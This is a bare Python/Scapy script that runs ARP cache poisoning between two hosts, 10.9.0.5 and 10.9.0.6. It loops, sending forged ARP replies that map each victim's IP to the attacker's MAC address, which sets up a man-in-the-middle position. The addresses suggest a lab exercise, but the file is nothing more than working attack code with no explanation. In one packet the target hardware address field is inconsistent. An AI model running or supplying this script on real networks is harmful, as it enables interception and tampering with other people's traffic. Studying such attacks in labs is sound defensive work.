#!/usr/bin/python3 
from scapy.all import * 

A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

ethA = Ether(src=M_mac,dst=A_mac) 
arpA = ARP(hwsrc=M_mac, psrc=B_ip,hwdst=A_mac, pdst=A_ip,op=2) 
ethB = Ether(src=M_mac,dst=B_mac) 
arpB = ARP(hwsrc=M_mac, psrc=A_ip,hwdst=A_mac, pdst=B_ip,op=2) 

while True:
    pktA = ethA / arpA
    sendp(pktA, count=1)
    pktB = ethB / arpB
    sendp(pktB, count=1)
    time.sleep(5)
